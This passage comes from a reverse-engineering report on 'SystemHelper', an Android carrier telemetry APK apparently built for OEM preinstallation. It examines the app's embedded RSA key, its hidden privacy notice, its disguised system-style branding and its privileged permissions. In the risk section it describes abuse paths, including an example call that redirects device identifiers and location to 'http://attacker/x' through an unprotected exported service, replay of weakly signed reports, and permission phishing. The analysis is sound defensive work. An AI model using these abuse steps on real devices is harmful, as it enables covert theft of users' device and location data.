BgNVBAsTBlVOSUNPTTEPMA0GA1UEAxMGVU5JQ09NMCAXDTE5MDUyNDA4NDQyN1oY
DzIxMTkwNDMwMDg0NDI3WjBaMQswCQYDVQQGEwJDTjELMAkGA1UECBMCQkoxCzAJ
BgNVBAcTAkJKMQ8wDQYDVQQKEwZVTklDT00xDzANBgNVBAsTBlVOSUNPTTEPMA0G
A1UEAxMGVU5JQ09NMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDB5OUB0H8c
SDBzUckwV95PbJQ7Roa0zeK/Vhge/3oNBhTSiGs9FvxVsdg5EnvwRtrlhajRqlw/
KU0iuTS2L2/yEUBYght91APPUpBHwWf1iV0mPIIqEuX13Xk8KtoMWcrZjJ3uxpO5
m6eIwWlddZX6Xoz5TtsHpIerCzQ8BScpawIDAQABoyEwHzAdBgNVHQ4EFgQUbTB4
FhwVS/xrNV65YHPYq6yzUxQwDQYJKoZIhvcNAQELBQADgYEAOLyKQudC/oy8PUyS
wy5KYcAtq2TM99pZMEvx2NQvmvO8V8JxHyicqP3t1qoClFp3HfmcinP9zDjjW2+L
Hs/xisUOuVT0MC+rGuvVr2WkmF5DNgavOkXXt1Dg64+u5DKOlT64/+GHSIuT8Ebx
btf++jS8fvhImsSBI/6q2HWchaM=
-----END CERTIFICATE-----
```

Usage and evaluation: Only used by `f0/c.c()` → `f0/k.b()`, as **RSA public key** to MD5 summary of reported data for `RSA/ECB/PKCS1Padding` encryption (generating `sign` parameters). The operator (China Unicom side) holds the private key to verify the signature. Three issues: ① **RSA-1024** (it is already weak in 2019 and can only encrypt a maximum of 117 bytes, which is far smaller than any real message, so it can only sign a summary); ② **self-signed, 100-year validity, CN/OU/O fully filled in `UNICOM`** has no CA chain and no user identification. Any party who obtains the private key can forge an "official" signature; ③ The public key is in the same domain as the business server (`dm.wo.com.cn`), indicating that this is a historical legacy key pair issued by the operator.

### 5.2 Three own strings (`res/values/strings.xml:42-45`)

| name | value | Notes |
|---|---|---|
| `app_name` | `SystemHelper` | English, **`values-zh-rCN` does not cover** → the English name is still displayed on the Chinese system; as a disguise for "system assistant" style naming |
| `setting_advice_title` | `Operator Service (SystemHelper)` | Calls itself "operator service" |
| `setting_advice_content` | `The operator may collect data such as your device information through WLAN or mobile data network. Turning it on is deemed to be consent to networking, access to application lists and positioning. ` | Privacy statement |

Meaning and problem: These two `setting_advice_*` **only exist in resources, and there is no code/layout referencing them** in the whole project (grep `smali` + `res`, only hit `strings.xml` and `public.xml`), indicating that the original "Settings/Guide Page" has been deleted or not accessed, and the privacy notice is that **is actually invisible to**. The copy itself regards "turn on" as a blanket consent to "networking/reading application list (`QUERY_ALL_PACKAGES`)/positioning", which is a typical general authorization technique, and does not mention actual collection items such as IMEI/IMSI/ICCID/cell/traffic.

### 5.3 Layout and XML configuration

- There is only 1 own layout: `res/layout/activity_test.xml` (677 B)
  `android.support.constraint.ConstraintLayout` → `ScrollView(368dp, padding 10dp)` → `TextView android:id="@id/tv_device_info"`（`0x7f0700cf`），`android:text="Device Info"`，`scrollbars="vertical"`。
  → The UI only has one screen of scrollable plain text debugging output, and **does not have any "setting/switch" control** (no Switch/CheckBox/SeekBar/EditText). The so-called "setting interface" does not exist in this version; configuration can only be completed through AIDL `i()/r()/s()` or directly changing prefs.
- The remaining 38 layouts are all `abc_*` / `notification_*` / `select_dialog_*` / `support_simple_spinner_dropdown_item` (included in the AppCompat + support library).
- `res/xml/motosystemhelper.xml` (313 B) - **key**:
  ```xml
  <permissions>
    <privapp-permissions package="com.mobiletools.systemhelper">
      <permission name="android.permission.PACKAGE_USAGE_STATS" />
      <permission name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
    </privapp-permissions>
  </permissions>
  ```
  → Whitelist file prepared for "Preset as `system/priv-app` privileged application" (must be placed in `/system/etc/permissions/motosystemhelper.xml` during installation). It means that the target delivery method of APK is that the **manufacturer/customized machine is pre-installed as the privileged application**, thereby bypassing the runtime authorization of `PACKAGE_USAGE_STATS` (application usage statistics) and `READ_PRIVILEGED_PHONE_STATE` (read IMEI/IMSI). The file name `moto…` implies adaptation to the Motorola/Lenovo series ROM.
- `res/xml/network_security_config.xml` (149 B): `<base-config cleartextTrafficPermitted="true"/>`, but **manifest does not reference `android:networkSecurityConfig`** → This file is a dead resource, and the actual clear text release depends on `android:usesCleartextTraffic="true"`.
- Theme `AppTheme` (`res/values/styles.xml`): `parent="Theme.AppCompat.Light.DarkActionBar"`, color matching `colorPrimary=#3f51b5`, `colorPrimaryDark=#303f9f`, `colorAccent=#ff4081` - **Android Studio default template color matching,** without any visual customization.

### 5.4 Icons (level of camouflage)

`res/mipmap-{m,h,x,xx,xxx}dpi/ic_launcher.png` and `ic_launcher_round.png` 10 files in total (1.9–14.7 KB):

- The content is **classic green Android robot (bugdroid) avatar**, the `round` version is a round version with a white background;
- Size 48/72/96/144/192 px, standard AS template export;
- **does not have any brand, operator (China Unicom/Gree/Nubia), functional semantic identification**.

Judgment: **is highly "system componentized" to disguise** - the icon directly borrows the official Android robot image, the application name `SystemHelper` (system assistant), Activity/Service and the naming (`TestActivity`, `RegisterHelperService`) are also deliberately neutral; combined with `sharedUserId`, privapp The purpose of the whitelist and the highest priority boot broadcast is to be treated as a system component on the desktop by users without uninstalling it.

### 5.5 `META-INF/com/android/build/gradle/app-metadata.properties`

```
appMetadataVersion=1.1
androidGradlePluginVersion=7.4.1
```

(`unknown\META-INF\com\android\build\gradle\app-metadata.properties` in apktool, 56 bytes. → Build chain is AGP 7.4.1, identical to `compileSdk 33`.)

### 5.6 `unknown/` and `original/` catalog

- `original/AndroidManifest.xml` (8120 B): The **original binary AXML** (undecoded version) saved by apktool is used for recoding/comparison; it is consistent with the decoded `AndroidManifest.xml` content in the root directory and has no additional hidden attributes (`android:debuggable` and `android:testOnly` do not appear).
- `unknown/`: apktool cannot be classified into the original package files of `res/`, a total of 28 files:
  - `META-INF/androidx.*_*.version`, `android.arch.*_*.version` (22 6-byte files): version mark of the AndroidX/Arch component (build product, no intelligence value);
  - `META-INF/com/android/build/gradle/app-metadata.properties`: See 5.5.
  - There is no `META-INF/*.RSA|*.SF|*.MF` signature file left (apktool discards it by default), so **cannot determine the signature fingerprint** from the decompilation directory (you need to return to APK and use `apksigner`).

---

## 6. Security risks and possible abuse points

Sort by availability:

1. **unprotected export AIDL service = remote configuration change/change server** (`RegisterHelperService`, exported + no permission)
   After any application bind: `r("http://attacker/x")` can redirect all subsequent telemetry (including IMEI/IMSI/ICCID/location/application list) **to the attacker server**; `i(1)` makes reporting once per second; `u()` deleting prefs will cause configuration loss DoS; `s(true)` Open the log to facilitate secondary collection.
2. **plain text HTTP + "encryption" reporting of self-signed weak keys** (`http://dm.wo.com.cn:18080/registerv3`, `application/encrypted-json`)
   - No transport layer TLS → The same network segment can be completely sniffed/tampered/replayed;
   - `body = AES-ECB(plaintext, key=MD5(plaintext))`: The key is derived from the plaintext itself. Anyone who intercepts **can decrypt** (MD5 ciphertext first? No - but because the key is enumerable/the known structure can be violently verified, it is actually equivalent to obfuscation). ECB also leaks the plaintext group repeat pattern;
   - `sign` is just RSA-1024 package MD5, **has no timestamp/nonce** and can be replayed; RSA-1024 can no longer be used as a long-term root of trust.
3. **`TestActivity` is used as a "permission phishing shell"**: Any application can `startActivity` pull it up, and the three system authorization boxes `READ_PHONE_STATE`/positioning/network status will pop up to the user (the copy and source are both displayed as this application). After induction authorization, this application will have the ability to collect; targetSdk 28, background startup Activity is not restricted by Android 10+.
4. **can be externally triggered acquisition/reporting amplifier**: `OnBootReceiver` and `SIMStateReceiver` are both exported and use "whether the action matches" as a branch. Any action (or null) will fall into the "report immediately/hang alarm" branch → External applications can repeatedly trigger reporting, amplify traffic and power consumption, and can also be used to detect whether applications are installed.
5. **`sharedUserId="com.mobiletools.systemhelper.uid"` + `sharedUserMaxSdkVersion=32`**: Reserved for sharing UID with other `com.mobiletools.*` applications of the same developer/same signature; once provisioned into the system, the same UID application can directly read and write this application prefs/DB (cross-application data plane).
6. **`android:priority="2147483647"`**: Raising the boot broadcast priority to the upper limit of int is a clear "front-running" technique (for `BOOT_COMPLETED`, it can affect the orderly broadcast sequence in older versions).
7. **privapp whitelist + high-sensitivity permission**: `motosystemhelper.xml` applies for `PACKAGE_USAGE_STATS`, `READ_PRIVILEGED_PHONE_STATE`; the list also states `QUERY_ALL_PACKAGES`, `ACCESS_BACKGROUND_LOCATION`, `SCHEDULE_EXACT_ALARM`, `READ_EXTERNAL_STORAGE`. Taken together, it is a collection of capabilities of "silent, background, and full device portrait", which seriously does not match the superficial positioning of "SystemHelper/operator service".
8. **privacy notice is not reachable**: The `setting_advice_*` string has no reference, and there is no setting/switch page in the UI → users can neither see the collection instructions nor turn off the collection (no UI switch; `f0/f.g` can only be changed by code).
9. **implementation-level flaws** (can be exploited by local attackers/forensics): `MODE_MULTI_PROCESS` prefs (consistency risk), `f0/l.a()` hard-coded `/data/data/...` absolute path (multi-user/split-screen environment fails), `f0/d.c()` uses `jsonString` The value is used as a deletion condition (multiple items with the same value will be deleted by mistake), `f0/a.b()` reuses the same PendingIntent (4-minute self-wake-up and 3-second retry cover each other), `f0/j` long message slicing off-by-one, `f0/h` abnormal path may be NPE and `RegisterJobService` are dead components.
10. **Unused signature-level custom permissions** (`com.mobiletools.systemhelper.permission`): could have been used to protect `RegisterHelperService`, but were not used - directly amplifying item 1.

---

## 7. Unknown items

1. The exact behavior of **`e0/r.k` / `e0/r.s`** (whether to remove permissions, which permissions to apply for, whether there is OEM Judgment): It belongs to others. This article only records all call points (DMApplication, OnBootReceiver, SIMStateReceiver, ScheduleRegisterReceiver, AppInfoRegisterReceiver, TestActivity, RegisterHelperService.onCreate) and trigger conditions (SDK≥30 / SDK≥31).
2. The mapping between the `c` subtype (`e0/z0` / `e0/c0` / `e0/e0`) returned by **`e0/c2.h(ctx)` and the specific OEM**: only `z0` → Nubia is confirmed `NBExtTelephony`, `c0`/`e0` → Binding branch of Gree `GreeTelephonyManager` (`RegisterIntentService.onCreate`); the configuration judgment logic is within the scope of others.
3. 40+ field semantics of **`d0/g` bean** (report the final field name/meaning of JSON): This article only uses `d()` (serialization), `M` (history array), `N` (signal) Array), `a/b/B/k/v` (model/manufact/DataSlot/NetworkOperator/NetworkOperatorSlot2); the complete field table should be given by the person in charge of `d0/*`.
4. The writing method of **`signal` table**: This version does not have any insert path (`f0/m` no insert method, no raw SQL in the whole project), `d0/f` only takes the instance without writing; it is speculated that it is leftover from the upstream version or relies on reflection/future versions. Unable to confirm write timing from this APK.
5. The actual server capabilities of **`serverAddress`**: `http://dm.wo.com.cn:18080` are the endpoints in use on China Unicom's live network. The specific meaning of the returned 416 ("registered"?) requires server-side evidence and cannot be confirmed locally.
6. **signature certificate/whether** is preset: The `META-INF` signature is missing in the decompilation directory, and the signature consistency with other applications of the `com.mobiletools.*` family cannot be judged; whether the `privapp` whitelist is actually adopted by a certain ROM cannot be inferred from APK.
7. **`u/j` (`R$styleable`) The names of the 231 fields**: This time only the quantity and array structure were exported (24 `int[]`), which were not expanded into `abc_xxx` attribute names - because they are all AppCompat internal attribute sets, the intelligence value is low, and they can be used separately if necessary `public.xml` + `attr` name reverse check.
8. The actual key list of **`f0/l.j/k` (`SystemProperties` reflection)**: the call points are all in `e0/*` (such as `ro.build.version.*`, `gsm.sim.*`), the key literals are passed in from each collector and belong to others; this article only confirms the shape of API (1 reference / 2 Reference / `"unknown"`).

---

### Attachment: Key documents involved in this article (for review)

- Listing: `apktool\AndroidManifest.xml`
- Component: `apktool\smali\com\mobiletools\systemhelper\{Activity,control,service}\*.smali`
- Tool layer: `apktool\smali\f0\{a..o}.smali` (`f0/l.smali` 778 lines, `f0/i.smali` 745 lines have been read in full)
- Constants: `apktool\smali\f0\f.smali`, `apktool\smali\u\{a..j}.smali`, `apktool\res\values\public.xml`
- Resources: `apktool\res\{layout\activity_test.xml, xml\motosystemhelper.xml, xml\network_security_config.xml, values\strings.xml, values\styles.xml}`, `apktool\assets\pub.cer`
- Contract call points (cross-module): `apktool\smali\d0\k.smali` (POST assembly), `apktool\smali\d0\j.smali` (signal reading), `apktool\smali\d0\h.smali` (export IP)
